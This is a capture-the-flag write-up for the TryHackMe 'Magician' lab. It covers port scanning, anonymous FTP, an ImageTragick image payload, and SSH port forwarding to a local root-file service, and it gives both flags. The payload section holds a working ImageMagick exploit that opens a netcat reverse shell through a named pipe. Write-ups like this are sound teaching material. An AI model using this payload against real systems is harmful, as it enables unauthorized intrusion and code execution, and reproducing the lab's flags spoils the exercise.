> Magician

**export IP=10.10.191.118**

# Nmap

nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
8081/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
```

# Nikto

nitko -h http://$IP:8081

```
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
```

# Gobuster

gobuster dir -u http://$IP:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial

```
/img (Status: 301)
/css (Status: 301)
/js (Status: 301)
```

# FTP

Anonymous Login

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though..
```

Looks like we can upload php files too!! But looks like a rabbit hole. Looking at the hint Imagetragick we can find payloads in `PayloadAllTheThings`. And this vulnerability is caused by ImageMagik Library. 

## Payload - try.png

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc 127.0.0.1 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
pop graphic-context
pop graphic-context
```

And we have a shell!! 

# user.txt

```
THM{simsalabim_hex_hex}
```

## Hint

```
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

Let's search for ports.

ss -anlt

```
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128                 0.0.0.0:8081             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128               127.0.0.1:6666             0.0.0.0:*       
LISTEN   0         100                       *:8080                   *:*       
LISTEN   0         32                        *:21                     *:*   
```

We can port forward using SSH.

In local machine start SSH. => sudo service ssh start

In target machine, => ssh -R 6666:localhost:6666 n00bmast3r@10.8.107.21 -p 125

And we have to setup a proxy using `foxyproxy`. `localhost`:`6666`.

And we can see a webpage requesting a filename to reveal it's content. Input `/root/root.txt`, we have the contents. Decoding it we have the flag!

# root.txt

```
THM{magic_may_make_many_men_mad}
```